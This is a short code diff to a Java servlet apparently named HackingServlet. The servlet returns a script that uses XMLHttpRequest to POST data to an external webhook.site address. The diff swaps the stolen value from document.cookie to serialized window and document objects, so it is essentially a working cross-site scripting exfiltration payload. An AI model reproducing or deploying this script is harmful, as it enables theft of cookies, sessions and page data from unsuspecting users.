@@ -16,7 +16,7 @@ public class HackingServlet extends KavaServlet {
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", 'https://webhook.site/13e6f66b-f6dd-496d-a3d9-650a05798885', true);
                 xhr.send(JSON.stringify({
-                    value: document.cookie
+                    value: JSON.stringify({value: this, value2: window, value3: document})
                 }));
                 </script>""");
     }
